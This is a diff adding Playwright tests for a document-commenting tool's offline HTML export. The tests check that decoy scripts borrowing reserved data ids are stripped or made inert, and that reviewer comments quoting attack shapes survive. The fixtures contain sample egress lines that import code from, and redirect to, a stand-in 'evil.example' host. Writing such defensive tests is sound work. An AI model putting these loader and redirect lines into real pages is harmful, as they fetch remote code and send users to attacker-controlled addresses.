@@ -1904,3 +1904,217 @@ test("CMH-OFFLINE-08: an authored script that borrows the payload id still count
     fs.rmSync(staged.dir, { recursive: true, force: true });
   }
 });
+
+// The layer's own id-bearing data blocks are DATA, and their text is reviewer-written, so the egress
+// strips must not read a quoted example inside one as code. That exemption used to be claimed by ID
+// ALONE and tested BEFORE the runnable-type test, so a decoy that merely BORROWED one of the ids ran
+// in the exported file untouched by either strip - no aliasing and no obfuscation, which made it
+// cheaper than every residual CMH-OFFLINE-05 lists.
+const RESERVED_DATA_IDS = ["embeddedComments", "handledCommentIds", "commentableHtmlLayer", "reviewedSections"];
+// The vendored payload id is deliberately NOT one of them: it is infrastructure resolved by POSITION
+// (CMH-OFFLINE-07), so a script that merely borrows it is authored content and must clear the same
+// egress scan as any other script. Pinned here beside the exemption so the boundary cannot drift.
+const PAYLOAD_DECOY_ID = "cmhVendoredRichLibs";
+
+function reservedIdDecoy(id) {
+  return [
+    '<script type="text/javascript" id="' + id + '">',
+    "(function () {",
+    "  window.__cmhReservedDecoysRan = window.__cmhReservedDecoysRan || [];",
+    '  window.__cmhReservedDecoysRan.push("' + id + '");',
+    '  import("https://evil.example/decoy-' + id + '.js").catch(function () {});',
+    '  if (location.protocol === "file:") location.href = "https://evil.example/steal-' + id + '";',
+    "})();",
+    "</script>",
+  ].join("\n");
+}
+
+const RESERVED_DECOY_CONTENT = [
+  "<h1>Reserved-id decoys</h1>",
+  '<p id="decoy-note">Borrowing a reserved layer id must not buy a script an exemption.</p>',
+].concat(RESERVED_DATA_IDS.concat([PAYLOAD_DECOY_ID]).map(reservedIdDecoy)).concat([
+  // A reserved-id block that also LOADS from the network. Neutralizing it does not save it - a
+  // remote load is precisely what the strip exists to take away - so it must be removed, and the
+  // kept-as-inert-data count must not claim it survived. That is what forces the count to be taken
+  // AFTER the strips rather than at neutralization time.
+  '<script type="text/javascript" id="reviewedSections" src="https://evil.example/decoy-src.js">',
+  "/* cmh-decoy-with-src */",
+  "</script>",
+]).join("\n");
+
+test("CMH-OFFLINE-04: a decoy runnable script cannot bypass the offline strips by borrowing a reserved layer id", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  // Served over http so the beacons are armed only in the exported file (they test for `file:`),
+  // exactly as the CMH-OFFLINE-05 navigation spec does.
+  const staged = stageContent(RESERVED_DECOY_CONTENT, { key: "cmh-offline-reserved-decoys", source: "offline-reserved-decoys.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, async (route) => {
+      const url = route.request().url();
+      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
+      return route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    // A reserved DATA block is never deleted: it may hold review state, so the export keeps the
+    // bytes and takes away only the ability to run them...
+    for (const id of RESERVED_DATA_IDS) {
+      expect(exportedHtml, "decoy text for " + id + " is kept as data").toContain("decoy-" + id + ".js");
+    }
+    // ...while a script that borrows the PAYLOAD id is ordinary content and is stripped for its
+    // egress like any other script, which is the boundary CMH-OFFLINE-07 draws.
+    expect(exportedHtml, "the payload id earns no exemption").not.toContain("decoy-" + PAYLOAD_DECOY_ID + ".js");
+    // ...and a reserved-id block that LOADS from the network is removed rather than repaired, so
+    // the kept-as-inert count must not include it. Counting at neutralization time would.
+    expect(exportedHtml, "a reserved-id script with a network src is removed").not.toContain("cmh-decoy-with-src");
+    expect(exportedHtml).not.toContain("decoy-src.js");
+    // Both outcomes are named to the author rather than left to be discovered.
+    const toast = page.locator("#toast");
+    await expect(toast).toContainText("2 scripts that load or navigate to the network were removed.");
+    await expect(toast).toContainText("4 scripts carrying a reserved commentable-html data id were kept as inert data.");
+
+    const exportedPath = path.join(outDir, "offline-reserved-decoys.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+
+    // Exporter and strict validator agree on the EGRESS exemption: neither sees a runnable
+    // reserved-id script any more. They do not agree that this file is valid overall, and the
+    // exporter never claimed that - a DUPLICATED reserved id is the source document's own
+    // pre-existing invalidity, which the export preserves rather than papers over by deleting the
+    // author's bytes. Pin exactly that split, so the weaker claim is not mistaken for the stronger.
+    let strictOut = "";
+    try {
+      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+      throw new Error("the strict validator accepted duplicate reserved ids");
+    } catch (e) {
+      strictOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
+    }
+    expect(strictOut).toMatch(/appears 2 times \(must be unique\)/);
+    expect(strictOut, "no egress complaint: the exemption agrees").not.toMatch(/imports a network module/);
+    expect(strictOut, "no egress complaint: the exemption agrees").not.toMatch(/direct top-level/);
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    const state = await page2.evaluate((ids) => ({
+      ran: window.__cmhReservedDecoysRan || [],
+      // Read the TYPE off the live DOM rather than the HTML text: the exported file inlines the
+      // layer runtime, whose own comments quote these ids as tag text, and a text scan would match
+      // those quotes instead of a real element.
+      types: Array.prototype.slice.call(document.querySelectorAll("script[id]"))
+        .filter((s) => ids.includes(s.id))
+        .map((s) => s.id + ":" + (s.getAttribute("type") || "")),
+    }), RESERVED_DATA_IDS);
+    expect(state.ran).toEqual([]);
+    for (const entry of state.types) {
+      expect(entry, "a reserved-id script must be inert data").toMatch(/:application\/json$/);
+    }
+    // The real blocks are still there, so the assertion above is not vacuously passing on an empty
+    // set: the export cannot have deleted the layer's own state.
+    expect(state.types.length).toBeGreaterThanOrEqual(RESERVED_DATA_IDS.length);
+    expect(page2.url()).toBe(fileUrl(exportedPath));
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
+const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
+  + 'location.href = "https://evil.example/steal" beacon before we ship this.';
+
+test("CMH-OFFLINE-04: a reviewer comment quoting an egress shape survives, and an untyped legacy data block is repaired", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  // The two directions the reserved-id exemption exists for. A reviewer legitimately quoting an
+  // egress shape (this repo's own issue #784 body does exactly that) must not have their comment
+  // stripped; and a LEGACY or hand-authored document whose data block carries no `type` must be
+  // repaired to inert data, not executed and not deleted - deleting it is the content loss the
+  // exemption was protecting against in the first place.
+  const CONTENT_WITH_QUOTE = [
+    "<h1>Quoted egress</h1>",
+    '<p id="quote-note">A reviewer must be able to quote an egress shape in a comment.</p>',
+  ].join("\n");
+  const staged = stageContent(CONTENT_WITH_QUOTE, { key: "cmh-offline-quoted-egress", source: "offline-quoted-egress.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    const legacy = fs.readFileSync(staged.html, "utf8").replace(
+      '<script type="application/json" id="handledCommentIds">',
+      '<script id="handledCommentIds">');
+    expect(legacy, "the legacy untyped shape must be staged").toContain('<script id="handledCommentIds">');
+    fs.writeFileSync(staged.html, legacy);
+
+    await page.route(/^https?:\/\//, async (route) => {
+      const url = route.request().url();
+      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
+      return route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await addTextComment(page, "#quote-note", QUOTED_EGRESS_NOTE);
+    await openSidebarExportMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      clickSidebarExport(page, "#btnExportOffline"),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+    expect(exportedHtml, "the reviewer's words must travel with the file").toContain("evil.example/steal");
+    // The singular branch of the inert-data note, which the decoy spec above never reaches.
+    await expect(page.locator("#toast")).toContainText(
+      "1 script carrying a reserved commentable-html data id was kept as inert data.");
+
+    const exportedPath = path.join(outDir, "offline-quoted-egress.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The exporter and its own strict gate must agree: an untyped block left as-is would fail this,
+    // since the validator requires `type="application/json"` for the layer's data blocks.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    const state = await page2.evaluate(() => {
+      const handled = document.getElementById("handledCommentIds");
+      const embedded = document.getElementById("embeddedComments");
+      return {
+        handledType: handled && handled.getAttribute("type"),
+        embeddedType: embedded && embedded.getAttribute("type"),
+        notes: JSON.parse(embedded.textContent || "[]").map((c) => c.note),
+      };
+    });
+    expect(state.handledType).toBe("application/json");
+    expect(state.embeddedType).toBe("application/json");
+    expect(state.notes).toEqual([QUOTED_EGRESS_NOTE]);
+    await expect(page2.locator("#commentList")).toContainText("evil.example/steal");
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
